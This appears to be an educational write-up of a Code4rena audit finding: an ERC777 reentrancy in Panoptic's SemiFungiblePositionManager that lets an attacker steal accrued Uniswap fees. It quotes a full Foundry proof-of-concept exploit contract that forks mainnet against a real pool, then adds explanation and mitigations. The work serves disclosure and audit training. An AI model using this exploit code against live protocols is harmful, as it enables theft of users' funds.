# Reentrancy in SemiFungiblePositionManager via ERC777 `tokensToSend` Hook

* **Severity**: High
* **Source**: [Code4rena](https://github.com/code-423n4/2023-11-panoptic-findings/issues/448) / [One Bug Per Day](https://www.onebugperday.com/v1/694)
* **Affected Contract**: [SemiFungiblePositionManager.sol](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol)
* **Vulnerability Type**: Reentrancy / Accounting Manipulation

## Original Bug Description

>## Lines of code
>
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L521](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L521)
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1004-L1006](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1004-L1006)
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1031-L1033](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1031-L1033)
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1062-L1066](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1062-L1066)
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1209-L1211](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1209-L1211)
>[https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L626-L630](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L626-L630)
>
>## Vulnerability details
>
>## Impact
>
>An attacker can steal all outstanding fees belonging to the SFPM in a uniswap pool if a token in the pool is an ERC777.
>
>## Proof of Concept
>
>The attack is possible due to the following sequence of events when minting a short option with `minTokenizedPosition()`:
>
>1. ERC1155 is minted. [L521](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L521)
>
>     ```solidity
>     _mint(msg.sender, tokenId, positionSize);
>     ```
>
>2. Liquidity is updated. [L1004](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1004-L1006)
>
>     ```solidity
>                 s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
>     ```
>
>3. An LP position is minted and tokens are transferred from `msg.sender` to uniswap. [L1031](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1031-L1033)
>
>     ```solidity
>                 _moved = isLong == 0
>                     ? _mintLiquidity(_liquidityChunk, _univ3pool) 
>                     : _burnLiquidity(_liquidityChunk, _univ3pool); 
>     ```
>
>4. feesBase is updated. [L1062](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1062-L1066)
>
>     ```solidity
>     s_accountFeesBase[positionKey] = _getFeesBase(
>                 _univ3pool,
>                 updatedLiquidity,
>                 _liquidityChunk
>             );
>     ```
>
>If at least one of the tokens transferred at step 3 is an ERC777 `msg.sender` can implement a `tokensToSender()` hook and transfer the ERC1155 before `s_accountFeesBase[positionKey]` has been updated. `registerTokenTransfer()` will copy `s_accountLiquidity[positionKey] > 0` and `s_accountFeesBase[positionKey] = 0` such that the receiver now has a ERC1155 position with non-zero liquidity but a `feesBase = 0`.
>
>When this position is burned the fees collected are calculated based on: [L209](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1209-L1211)
>
>```solidity
>int256 amountToCollect = _getFeesBase(univ3pool, startingLiquidity, liquidityChunk).sub(s_accountFeesBase[positionKey]
>```
>
>The attacker will withdraw fees based on the current value of `feeGrowthInside0LastX128` and `feeGrowthInside1LastX128` and not the difference between the current values and when the short position was created.
>
>The attacker can chose the tick range such that `feeGrowthInside1LastX128` and `feeGrowthInside1LastX128` are as large as possible to minimize the liquidity needed steal all available fees.
>
>## POC
>
>The `AttackImp` contract below implements the `tokensToSend()` hook and transfer the ERC1155 before `feesBase` has been set. An address `Attacker` deploys `AttackImp` and calls `AttackImp#minAndTransfer()` to start the attack. To finalize the attack they burn the position and steal all available fees that belongs to the SFPM.
>
>In the POC we use the [VRA pool](https://github.com/code-423n4/2023-11-panoptic-findings/issues/0x98409d8CA9629FBE01Ab1b914EbF304175e384C8) as an example of a uniswap pool with a ERC777 token.
>
>Create a test file in `2023-11-panoptic/test/foundry/core/Attacker.t.sol` and paste the below code. Run forge `test --match-test testAttack --fork-url "https://eth.public-rpc.com" --fork-block-number 18755776 -vvv` to execute the POC.
>
>```solidity
>// SPDX-License-Identifier: UNLICENSED
>pragma solidity ^0.8.0;
>
>import "forge-std/Test.sol";
>import {stdMath} from "forge-std/StdMath.sol";
>import {Errors} from "@libraries/Errors.sol";
>import {Math} from "@libraries/Math.sol";
>import {PanopticMath} from "@libraries/PanopticMath.sol";
>import {CallbackLib} from "@libraries/CallbackLib.sol";
>import {TokenId} from "@types/TokenId.sol";
>import {LeftRight} from "@types/LeftRight.sol";
>import {IERC20Partial} from "@testUtils/IERC20Partial.sol";
>import {TickMath} from "v3-core/libraries/TickMath.sol";
>import {FullMath} from "v3-core/libraries/FullMath.sol";
>import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
>import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
>import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
>import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
>import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
>import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
>import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
>import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
>import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
>import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
>import {PositionUtils} from "../testUtils/PositionUtils.sol";
>import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
>import {ReenterMint, ReenterBurn} from "../testUtils/ReentrancyMocks.sol";
>
>import {ERC1820Implementer} from "openzeppelin-contracts/contracts/utils/introspection/ERC1820Implementer.sol";
>import {IERC1820Registry} from "openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol";
>import {ERC1155Receiver} from  "openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
>
>import "forge-std/console2.sol";
>
>contract SemiFungiblePositionManagerHarness is SemiFungiblePositionManager {
>    constructor(IUniswapV3Factory _factory) SemiFungiblePositionManager(_factory) {}
>
>    function poolContext(uint64 poolId) public view returns (PoolAddressAndLock memory) {
>        return s_poolContext[poolId];
>    }
>
>    function addrToPoolId(address pool) public view returns (uint256) {
>        return s_AddrToPoolIdData[pool];
>    }
>}
>
>contract AttackImp is ERC1820Implementer{
>    
>    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =
>        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
>        
>    IERC1820Registry _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
>
>
>    SemiFungiblePositionManagerHarness sfpm;
>    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
>
>    address token0;
>    address token1;
>    uint256 tokenId;
>    uint128 positionSize;
>    address owner;
>
>    constructor(address _token0, address _token1, address _sfpm) {    
>        owner = msg.sender;
>        sfpm = SemiFungiblePositionManagerHarness(_sfpm);
>        token0 = _token0;
>        token1 = _token1;
>
>        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
>        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
>
>        IERC20Partial(token0).approve(address(router), type(uint256).max);
>        IERC20Partial(token1).approve(address(router), type(uint256).max);
>
>        _registerInterfaceForAddress(
>            TOKENS_SENDER_INTERFACE_HASH,
>            address(this)
>        );
>        
>        IERC1820Registry(_ERC1820_REGISTRY).setInterfaceImplementer(
>            address(this), 
>            TOKENS_SENDER_INTERFACE_HASH,
>            address(this)
>        );
>
>    }
>    
>    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4){
>        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
>    }
>        
>    function mintAndTransfer(
>        uint256 _tokenId,
>        uint128 _positionSize,
>        int24 slippageTickLimitLow, 
>        int24 slippageTickLimitHigh
>        ) public
>    {
>        tokenId = _tokenId;
>        positionSize = _positionSize;
>
>        sfpm.mintTokenizedPosition(
>        tokenId,
>        positionSize,
>        slippageTickLimitLow, 
>        slippageTickLimitHigh
>        );
>    }
>
>    function tokensToSend(
>        address operator,
>        address from,
>        address to,
>        uint256 amount,
>        bytes calldata userData,
>        bytes calldata operatorData
>    ) external {
>        sfpm.safeTransferFrom(address(this), owner, tokenId, positionSize, bytes(""));
>
>    }
>
>}
>
>contract stealFees is Test {
>    using TokenId for uint256;
>    using LeftRight for int256;
>    using LeftRight for uint256;
>
>    address VRA = 0xF411903cbC70a74d22900a5DE66A2dda66507255;
>    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
>    IUniswapV3Pool POOL = IUniswapV3Pool(0x98409d8CA9629FBE01Ab1b914EbF304175e384C8);
>    IUniswapV3Factory V3FACTORY = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
>    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
>
>    SemiFungiblePositionManagerHarness sfpm;
>
>    IUniswapV3Pool pool;
>    uint64 poolId;
>    address token0;
>    address token1;
>    uint24 fee;
>    int24 tickSpacing;
>    uint256 isWETH; 
>
>    int24 currentTick;
>    uint160 currentSqrtPriceX96;
>    uint256 feeGrowthGlobal0X128;
>    uint256 feeGrowthGlobal1X128;
>    
>    address Attacker = address(0x12356838383);
>    address Merlin = address(0x12349931);
>    address Swapper = address(0x019399312349931);
>    
>    //Width and strike is set such that at least one tick is already initialized
>    int24 width = 60;
>    int24 strike = 125160+60; 
>
>    uint256 tokenId;
>    AttackImp Implementer; 
>    
>    int24 tickLower;
>    int24 tickUpper;
>
>    uint128 positionSize;
>    uint128 positionSizeBurn;
>
>
>    function setUp() public {
>        sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
>    }
>
>    function _initPool(uint256 seed) internal {
>        _cacheWorldState(POOL);
>        sfpm.initializeAMMPool(token0, token1, fee);
>    }
>
>    function _cacheWorldState(IUniswapV3Pool _pool) internal {
>        pool = _pool;
>        poolId = PanopticMath.getPoolId(address(_pool));
>        token0 = _pool.token0();
>        token1 = _pool.token1();
>        isWETH = token0 == address(WETH) ? 0 : 1;
>        fee = _pool.fee();
>        tickSpacing = _pool.tickSpacing();
>        (currentSqrtPriceX96, currentTick, , , , , ) = _pool.slot0();
>        feeGrowthGlobal0X128 = _pool.feeGrowthGlobal0X128();
>        feeGrowthGlobal1X128 = _pool.feeGrowthGlobal1X128();
>    }
>
>    function addUniv3pool(uint256 self, uint64 _poolId) internal pure returns (uint256) {
>        unchecked {
>            return self + uint256(_poolId);
>        }
>    }
>
>    function generateFees(uint256 run) internal {
>        for (uint256 x; x < run; x++) {
>
>        }
>    }
>
>    function testAttack() public {
>            
>        _initPool(1);
>        positionSize = 1e18;
>
>        tokenId = uint256(0).addUniv3pool(poolId).addLeg(
>            0,
>            1,
>            isWETH,
>            0,
>            0,
>            0,
>            strike,
>            width
>        );
>
>        (tickLower, tickUpper) = tokenId.asTicks(0, tickSpacing);
>
>
>        //------------ Honest user mints short position ------------------------------
>
>        vm.startPrank(Merlin); 
>
>        deal(token0, Merlin, type(uint128).max);
>        deal(token1, Merlin, type(uint128).max);
>
>        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
>        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
>
>        IERC20Partial(token0).approve(address(router), type(uint256).max);
>        IERC20Partial(token1).approve(address(router), type(uint256).max);
>
>        (int256 totalCollected, int256 totalSwapped, int24 newTick ) = sfpm.mintTokenizedPosition(
>            tokenId,
>            uint128(positionSize),
>            TickMath.MIN_TICK,
>            TickMath.MAX_TICK
>        );
>
>        (uint128 premBeforeSwap0, uint128 premBeforeSwap1) = sfpm.getAccountPremium(
>                address(pool),
>                Merlin,
>                0,
>                tickLower,
>                tickUpper,
>                currentTick,
>                0
>        );
>
>        uint256 accountLiqM = sfpm.getAccountLiquidity(
>            address(POOL),
>            Merlin,
>            0,
>            tickLower,
>            tickUpper
>        );
>
>
>        console2.log("Premium in token0 belonging to Merlin before swaps:   ", Math.mulDiv64(premBeforeSwap0, accountLiqM.rightSlot()));
>        console2.log("Premium in token1 belonging to Merlin before swaps:   ", Math.mulDiv64(premBeforeSwap1, accountLiqM.rightSlot()));
>
>        //------------ Swap in pool to generate fees -----------------------------
>
>        changePrank(Swapper);
>
>        deal(token0, Swapper, type(uint128).max);
>        deal(token1, Swapper, type(uint128).max);
>
>        IERC20Partial(token0).approve(address(router), type(uint256).max);
>        IERC20Partial(token1).approve(address(router), type(uint256).max);
>        
>        uint256 swapSize = 10e18;
>
>        router.exactInputSingle(
>            ISwapRouter.ExactInputSingleParams(
>                isWETH == 0 ? token0 : token1,
>                isWETH == 1 ? token0 : token1,
>                fee,
>                Swapper,
>                block.timestamp,
>                swapSize,
>                0,
>                0
>            )
>        );
>
>        router.exactOutputSingle(
>            ISwapRouter.ExactOutputSingleParams(
>                isWETH == 1 ? token0 : token1,
>                isWETH == 0 ? token0 : token1,
>                fee,
>                Swapper,
>                block.timestamp,
>                swapSize - (swapSize * fee) / 1_000_000,
>                type(uint256).max,
>                0
>            )
>        );
>
>        (, currentTick, , , , , ) = pool.slot0();
>
>        // poke uniswap pool
>        changePrank(address(sfpm));
>        pool.burn(tickLower, tickUpper, 0);
>
>        (uint128 premAfterSwap0, uint128 premAfterSwap1) = sfpm.getAccountPremium(
>                address(pool),
>                Merlin,
>                0,
>                tickLower,
>                tickUpper,
>                currentTick,
>                0
>        );
>
>
>        console2.log("Premium in token0 belonging to Merlin after swaps:    ", Math.mulDiv64(premAfterSwap0, accountLiqM.rightSlot()));
>        console2.log("Premium in token1 belonging to Merling after swaps:   ", Math.mulDiv64(premAfterSwap1, accountLiqM.rightSlot()));
>
>
>        // -------------- Attack is performed  -------------------------------
>        
>        
>        changePrank(Attacker); 
>
>        Implementer = new AttackImp(token0, token1, address(sfpm)); 
>
>        deal(token0, address(Implementer), type(uint128).max);
>        deal(token1, address(Implementer), type(uint128).max);
>
>        Implementer.mintAndTransfer(
>            tokenId,
>            uint128(positionSize),
>            TickMath.MIN_TICK,
>            TickMath.MAX_TICK
>        );
>
>        
>        uint256 balance = sfpm.balanceOf(Attacker, tokenId);
>        uint256 balance2 = sfpm.balanceOf(Merlin, tokenId);
>
>        
>        (uint128 premTokenAttacker0, uint128 premTokenAttacker1) = sfpm.getAccountPremium(
>                address(pool),
>                Merlin,
>                0,
>                tickLower,
>                tickUpper,
>                currentTick,
>                0
>        );
>
>        (, , , uint256 tokensowed0, uint256 tokensowed1) = pool.positions(
>            PositionKey.compute(address(sfpm), tickLower, tickUpper)
>        );
>         
>        console2.log("Fees in token0 available to SFPM before attack:       ", tokensowed0);
>        console2.log("Fees in token1 available to SFPM before attack:       ", tokensowed1);
>        
>        
>        sfpm.burnTokenizedPosition(
>            tokenId,
>            uint128(positionSize),
>            TickMath.MIN_TICK,
>            TickMath.MAX_TICK
>        );
>                
>        (, , , tokensowed0, tokensowed1) = pool.positions(
>            PositionKey.compute(address(sfpm), tickLower, tickUpper)
>        );
>         
>        console2.log("Fees in token0 available to SFPM after attack:        ", tokensowed0);
>        console2.log("Fees in token1 available to SFPM after attack:        ", tokensowed1);
>
>        {
>            // Tokens used for attack, deposited through implementer
>            uint256 attackerDeposit0 = type(uint128).max - IERC20(token0).balanceOf(address(Implementer)); 
>            uint256 attackerDeposit1 = type(uint128).max - IERC20(token1).balanceOf(address(Implementer));
>            
>            uint256 attackerProfit0 =IERC20(token0).balanceOf(Attacker)-attackerDeposit0;
>            uint256 attackerProfit1 =IERC20(token1).balanceOf(Attacker)-attackerDeposit1;
>
>            console2.log("Attacker Profit in token0:                            ", attackerProfit0);
>            console2.log("Attacker Profit in token1:                            ", attackerProfit1); 
>            
>            assertGe(attackerProfit0+attackerProfit1,0);
>        }        
>    }
>} 
>```
>
>## Tools Used
>
>vscode, foundry
>
>## Recommended Mitigation Steps
>
>Update liquidity after minting/burning
>
>```solidity
>            _moved = isLong == 0
>                ? _mintLiquidity(_liquidityChunk, _univ3pool) 
>                : _burnLiquidity(_liquidityChunk, _univ3pool); 
>
>            s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
>                updatedLiquidity 
>            );
>```
>
>For redundancy `registerTokensTransfer()` can also use the `ReentrancyLock()` modifier to always block reentrancy when minting and burning.
>
>## Assessed type
>
>Reentrancy

## Summary

`SemiFungiblePositionManager` (SFPM) allows minting and burning of tokenized Uniswap V3 positions. These operations involve **transferring ERC20/777 tokens** into SFPM, updating internal fee accounting, and issuing ERC1155 tokens as receipts.

Because SFPM does not guard against **ERC777 reentrancy hooks** (`tokensToSend`), an attacker can reenter SFPM during mint or burn **before internal accounting (`feesBase`, liquidity tracking) is finalized**.

This lets the attacker **transfer or burn positions at an inconsistent state** and ultimately **steal all pending Uniswap fee revenue** owed to honest users.

## A Better Explanation (With Simplified Example)

### Intended Behavior

1. **Minting a Position**

   * User deposits tokens (could be ERC20 or ERC777).
   * SFPM locks liquidity into the correct Uniswap V3 pool.
   * Internal state (`feesBase`, liquidity slots) is updated.
   * User receives an ERC1155 position token.

2. **Burning a Position**

   * User returns ERC1155 tokens.
   * SFPM pulls liquidity and settles pending fees.
   * Updates state to reflect the reduced position.
   * Returns tokens + accrued fees to the user.

### What Actually Happens (Bug)

* ERC777 tokens trigger the **`tokensToSend` hook** on transfer.
* If attacker registers a malicious hook, they can call back into SFPM **mid-mint or mid-burn**, while accounting variables (`feesBase`, liquidity slots) are **not yet written**.
* Attacker moves their ERC1155 receipt or calls burn during this window, tricking SFPM into calculating fee entitlements incorrectly.
* When burn finalizes, the attacker drains **all available fees** from the pool.

### Why This Matters

* Honest LPs (e.g., Merlin in PoC) generate real fees.
* Attacker (Mallory) steals them by exploiting the accounting gap.
* The system assumes transfers are atomic — but ERC777 breaks this assumption.
* High-severity impact: a single attacker can **drain all accrued Uniswap fees** belonging to many users.

### Concrete Walkthrough (Merlin & Mallory)

* **Merlin**

  * Mints a short position in the VRA/WETH pool.
  * Liquidity is active, and swaps occur → Uniswap pool accrues fees.

* **Mallory**

  * Deploys `AttackImp`, an ERC1820 implementer.
  * Registers `tokensToSend()` hook to reenter SFPM.
  * Calls `mintAndTransfer()` on SFPM.

* **Critical Reentrancy**

  * SFPM transfers ERC777 tokens in → ERC777 triggers `tokensToSend()`.
  * Mallory's hook executes, calling `safeTransferFrom()` inside SFPM before `feesBase` is set.
  * Later, Mallory calls `burnTokenizedPosition()`.
  * SFPM distributes **all pool fees** to Mallory, leaving Merlin with nothing.

> **Analogy**:
> Imagine a vault handing out tickets when you deposit cash. Normally, they record your balance before giving the ticket.
> But here, the attacker can *pause the teller mid-transaction*, grab the ticket early, and then claim **everyone else's earnings** when cashing out.

## Vulnerable Code Reference

**1) `mintTokenizedPosition` and `burnTokenizedPosition` rely on external ERC20/777 transfers**

```solidity
// ERC777 transfer triggers tokensToSend()
IERC20Partial(token0).transferFrom(msg.sender, address(this), amount0);
IERC20Partial(token1).transferFrom(msg.sender, address(this), amount1);

// vulnerable because accounting update comes after external transfer
s_accountLiquidity[positionKey] = ... // happens later
```

**2) Reentrancy possible in `registerTokensTransfer`**

```solidity
function registerTokensTransfer(...) internal {
    // no reentrancy guard here
    // hooks like ERC777.tokensToSend() can reenter SFPM
}
```

## Recommended Mitigation

1. **Update state before external calls**
   Always finalize liquidity and fee accounting *before* performing token transfers.

2. **Reentrancy Lock**
   Wrap mint/burn flows in a `nonReentrant` modifier or Panoptic's `ReentrancyLock` utility.

3. **Restrict ERC777 usage**

   * Optionally, block ERC777 tokens entirely.
   * Or enforce safe wrappers that bypass hooks.

## Pattern Recognition Notes

* **Classic ERC777 pitfall**: Any protocol that assumes ERC20 semantics can be broken by ERC777 hooks.
* **External call ordering**: If state is updated **after** an external call, attacker can exploit the "gap."
* **Liquidity manager contracts** (Compound, Uniswap wrappers, vaults) are high-value targets because fee/reward accounting is delicate.
* **Mitigation pattern**:

  * State changes → external effects → final assertions.
  * Or use `Checks-Effects-Interactions` pattern strictly.

### Quick Recall (TL;DR)

* **Bug**: ERC777 `tokensToSend()` hook lets attacker reenter SFPM during mint/burn before accounting is set.
* **Impact**: Attacker drains **all accrued fees** from the pool, stealing from honest users.
* **Fix**: Update state before transfers + add reentrancy locks; consider banning ERC777.
